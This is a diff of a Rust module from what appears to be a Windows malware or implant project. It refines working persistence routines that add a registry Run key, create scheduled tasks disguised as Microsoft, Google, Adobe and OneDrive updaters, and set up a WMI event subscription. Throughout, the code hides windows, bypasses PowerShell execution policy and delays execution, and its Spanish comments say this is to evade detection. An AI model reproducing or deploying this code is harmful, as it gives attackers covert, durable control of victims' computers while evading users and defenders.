@@ -20,15 +20,12 @@
 //! let result = establish_persistence(PersistenceMethod::RegistryRun);
 //! ```
 
-use crate::debug_print;
-
 #[cfg(target_os = "windows")]
 use std::process::Command;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 use std::env;
 use std::path::{Path, PathBuf};
-use std::fs;
 
 /// Available persistence methods for maintaining access.
 ///
@@ -124,16 +121,19 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     // El "/min" hace que se ejecute minimizado (menos visible)
     let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
     
-    // Build the reg command - no additional obfuscation needed as the command
-    // already uses cmd.exe wrapper which provides sufficient obfuscation
-    let reg_cmd = format!("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {} /t REG_SZ /d \"{}\" /f", 
-        reg_name, obfuscated_cmd);
-    
-    debug_print!("DEBUG: Comando de persistencia: {}", reg_cmd);
-    
-    // Execute the command via cmd
-    let output = Command::new("cmd")
-        .args(&["/C", &reg_cmd])
+    // Intentar HKCU primero (no requiere admin)
+    let output = Command::new("reg")
+        .args(&[
+            "add",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "/v",
+            reg_name,
+            "/t",
+            "REG_SZ",
+            "/d",
+            &obfuscated_cmd,
+            "/f",
+        ])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando reg add: {}", e))?;
@@ -153,12 +153,12 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
         .ok_or("Ruta inválida")?;
     
-    // Nombres que imitan tareas reales del sistema
+    // Nombres que imitan tareas reales del sistema (sin espacios)
     let task_names = [
         "MicrosoftEdgeUpdateTaskUser",
         "GoogleUpdateTaskUser",
-        "OneDrive Standalone Update Task",
-        "Adobe Flash Player Updater",
+        "OneDriveStandaloneUpdate",
+        "AdobeFlashPlayerUpdater",
         "CCleanerCrashReporting",
     ];
     let pid = std::process::id() as usize;
@@ -167,15 +167,16 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     // OFUSCACIÓN: Usar cmd /c con delay y start /min
     let obfuscated_cmd = format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str);
     
-    // Build the schtasks command - no additional obfuscation needed
-    let schtasks_cmd = format!("schtasks /Create /SC ONLOGON /TN \"{}\" /TR \"{}\" /DELAY 0001:00 /F",
-        task_name, obfuscated_cmd);
-    
-    debug_print!("DEBUG: Comando schtasks: {}", schtasks_cmd);
-    
-    // Execute the command via cmd
-    let output = Command::new("cmd")
-        .args(&["/C", &schtasks_cmd])
+    // Crear tarea con DELAY de 1 minuto para evitar detección inmediata
+    let output = Command::new("schtasks")
+        .args(&[
+            "/Create",
+            "/SC", "ONLOGON",
+            "/TN", task_name,
+            "/TR", &obfuscated_cmd,
+            "/DELAY", "0001:00", // 1 minuto de delay
+            "/F",
+        ])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
@@ -208,45 +209,20 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let obfuscated_cmd = format!("cmd.exe /c start /min powershell.exe -WindowStyle Hidden -File \"{}\"", exe_str);
     
     // WMI con eventos menos monitoreados y intervalos más largos (4 horas)
+    // Usar comillas simples para evitar problemas de escape
     let ps_script = format!(
-        r#"
-        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
-        $FilterName = '{}'
-        $ConsumerName = '{}'
-        $ExePath = '{}'
-        
-        # Crear Filter
-        $Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
-        $Filter.Name = $FilterName
-        $Filter.EventNamespace = 'root\cimv2'
-        $Filter.QueryLanguage = 'WQL'
-        $Filter.Query = $Query
-        $Filter.Put() | Out-Null
-        
-        # Crear Consumer
-        $Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
-        $Consumer.Name = $ConsumerName
-        $Consumer.CommandLineTemplate = $ExePath
-        $Consumer.Put() | Out-Null
-        
-        # Binding
-        $Binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
-        $Binding.Filter = $Filter
-        $Binding.Consumer = $Consumer
-        $Binding.Put() | Out-Null
-        "#,
+        r#"$Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour = 12'; $FilterName = '{}'; $ConsumerName = '{}'; $ExePath = '{}'; $Filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $Filter.Name = $FilterName; $Filter.EventNamespace = 'root\cimv2'; $Filter.QueryLanguage = 'WQL'; $Filter.Query = $Query; $Filter.Put() | Out-Null; $Consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $Consumer.Name = $ConsumerName; $Consumer.CommandLineTemplate = $ExePath; $Consumer.Put() | Out-Null; $Binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $Binding.Filter = $Filter; $Binding.Consumer = $Consumer; $Binding.Put() | Out-Null"#,
         event_name, event_name, obfuscated_cmd
     );
     
-    // Build the PowerShell command - no additional obfuscation needed as the
-    // PowerShell script is already complex and argfuscator would break it
-    let ps_cmd = format!("powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{}\"", 
-        ps_script.replace("\"", "`\""));
-    
-    debug_print!("DEBUG: Comando PowerShell: {}", ps_cmd);
-    
-    let output = Command::new("cmd")
-        .args(&["/C", &ps_cmd])
+    let output = Command::new("powershell")
+        .args(&[
+            "-NoProfile",
+            "-WindowStyle", "Hidden",
+            "-ExecutionPolicy", "Bypass",
+            "-Command",
+            &ps_script,
+        ])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
